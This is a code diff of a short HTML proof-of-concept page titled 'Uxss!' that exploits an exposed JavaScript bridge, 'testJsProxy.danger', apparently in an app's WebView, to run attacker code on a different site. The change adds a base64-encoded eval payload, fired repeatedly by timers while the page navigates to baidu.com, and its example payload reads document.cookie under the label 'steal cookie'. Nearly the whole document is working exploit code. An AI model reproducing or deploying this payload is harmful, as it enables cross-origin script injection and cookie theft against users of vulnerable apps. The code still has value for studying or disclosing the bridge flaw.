@@ -1,16 +1,23 @@
 <h1>Uxss!</h1>
 <script>
-  function triggerPoc(url){
+  function triggerPoc(url,code){
+    const currUrl = location.href;
+    const payload = `
+    if(!location.href.startsWith("${currUrl}") && !window.__cloudx){
+      window.__cloudx = true;
+      ${code}
+    }`;
+    const base64 = btoa(payload);
     for(let i=0; i<1000; i++){
       setTimeout(function(){
       if(window.testJsProxy && typeof window.testJsProxy.danger === "function"){
-        window.testJsProxy.danger(`console.log("cloudx -> " + location.href);window.testJsProxy.danger("console.log(1)")`);
-        //window.testJsProxy.danger(`window.testJsProxy.danger(123)`);
+        window.testJsProxy.danger(`eval(atob("${base64}"))`);
+
       }},i)
     }
     location.href = url;
   }
   window.addEventListener('load', () => {
-    triggerPoc("https://www.baidu.com")
+    triggerPoc("https://www.baidu.com", `console.log('CloudX steal cookie:'+document.cookie)`)
   })
 </script>
